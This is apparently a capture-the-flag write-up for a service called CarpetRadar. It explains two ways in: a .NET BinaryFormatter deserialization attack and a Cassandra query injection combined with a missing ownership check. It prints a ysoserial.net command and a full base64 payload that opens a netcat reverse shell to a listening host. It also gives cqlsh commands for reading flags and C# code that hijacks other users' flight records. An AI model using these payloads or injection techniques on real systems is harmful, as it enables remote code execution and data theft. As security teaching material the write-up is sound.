Service CarpetRadar has Web on port 7000 and TCP Server on port 12345. On Web you can register, authenticate and retrieve statistics about flights on magic carpets all around the world. TCP Server receives FlightStates - information about position from aerial vehicles.

Flag is stored in field `license` of the flight.



### RCE

FlightState model is C#-class and is sent serialized in binary format using ordinary C# BinaryFormatter (`System.Runtime.Serialization.Formatters.Binary.BinaryFormatter`). 

It is possible to generate malformed serialized data which forces server to execute any code.

The easiest way to generate serialized binary data with reverse shell payload is to use lovely [ysoserial.net  tool](https://github.com/pwntester/ysoserial.net) (let's say thanks to Alvaro Muñoz [pwntester](https://github.com/pwntester) for it).

Suppose, we listen port 9000 on 192.168.0.106 (run `nc -lp 9000`).

Compile ysoserial.exe, generate malformed data  for Mono with payload `apt update && apt install -y netcat && nc -e /bin/sh 192.168.0.106 9000` to make reverse shell.

    ./ysoserial.exe -g TypeConfuseDelegateMono -f BinaryForm
    atter -c "sh -c 'apt update && apt install -y netcat && nc -e /bin/sh 192.168.0.106 9000'" -o base64 --rawcmd
<details>
  <summary>Base64 result</summary>
    AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAEwtYyAnYXB0IHVwZGF0ZSAmJiBhcHQgaW5zdGFsbCAteSBuZXRjYXQgJiYgbmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjAuMTA2IDkwMDAnBgcAAAACc2gEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkJAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCgAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYLAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDAAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg0AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDgAAAAVTdGFydAkPAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ4AAAAJDAAAAAkNAAAABhMAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQ8AAAAIAAAACQoAAAAJCwAAAAoJDAAAAAkNAAAACQ4AAAAKCw==
</details>

Send it to tcp server (example in `sender.py`). Voila, now we have reverse shell.

<details>
    <summary>For example, we can run `ls -la` in attacked server</summary>
<image src=".\proof.png"></image>
</details>

We can install CQL Shell and get flags from Cassandra database:

```bash
> apt update
> apt install python-pip
> pip install cqlsh
> cqlsh --cqlversion=3.4.4 cassandra
```
```CQL
cqlsh> use carpetradar;
cqlsh:carpetradar> select license from carpetFlights;
```



### Changing user_id in flight (using CQL-injection)

This vulnerability is partily unintended. It was known that some user's input are not validated and there can be injection in Cassandra Query Language, but we slightly forgot API of service and thought that it is not possible to retrieve user information using it.

Actually, you from TCP Server you get list of current carpet positions and also UserId and FlightId for every carpet. This info is stored in table `carpetFlights`. `flight_id` is primary key and on updating there are no validation that flight record belongs to the user which created it.

**Table structure**

```
CREATE COLUMNFAMILY IF NOT EXISTS carpetFlights
id uuid, 
user_id uuid, 
label ascii, 
license ascii, 
time list<timestamp>, 
x list<int>, 
y list<int>, 
finished boolean, 
PRIMARY KEY(id));
```

**Request used for updating in service**

```
UPDATE carpetFlights SET 
user_id = {userId}, 
label = '{flightState.Label}',
license = '{flightState.License}',
finished = {flightState.Finished},
x = x + [{flightState.X}],
y = y + [{flightState.Y}],
time = time + [{time}]
WHERE id = {flightState.FlightId};");
```



Register and get auth token for your user. From response you can deserialize `flights_ids` of other users. Then send FlightState with your token and other team's `flight_id` to reassign `user_id`. Also we don't want to overwrite `license` so we should put `'` in Label and License (after it Label will have value ` ', license = '` and License will not change).

```
var fs = new FlightState()
{
    Token = token,
    X = 1,
    Y = 1,
    FlightId = position.FlightId,
	Label = "'",
	License = "'",
	Finished = false
};
```

So it will make this flight belongs to your user and its license will be available to you from `/Chronicle` page.